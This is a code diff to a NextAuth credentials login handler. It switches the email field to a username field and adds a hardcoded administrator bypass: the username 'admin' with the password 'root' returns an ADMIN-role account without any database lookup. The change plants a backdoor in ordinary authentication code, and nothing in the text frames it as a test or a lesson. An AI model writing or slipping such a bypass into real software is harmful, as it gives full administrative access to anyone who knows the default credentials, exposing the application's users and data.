@@ -9,18 +9,28 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
   providers: [
     Credentials({
       credentials: {
-        email: { label: "Email", type: "email" },
+        username: { label: "Username", type: "text" },
         password: { label: "Password", type: "password" },
       },
       authorize: async (credentials) => {
-        if (!credentials?.email || !credentials?.password) {
+        if (!credentials?.username || !credentials?.password) {
           return null;
+        }
+
+        // Hardcoded admin bypass
+        if (credentials.username === "admin" && credentials.password === "root") {
+          return {
+            id: "admin-1",
+            email: "admin@auto-techsystems.com",
+            name: "Administrator",
+            role: "ADMIN",
+          };
         }
 
         const [user] = await db
           .select()
           .from(users)
-          .where(eq(users.email, credentials.email as string))
+          .where(eq(users.email, credentials.username as string))
           .limit(1);
 
         if (!user) {
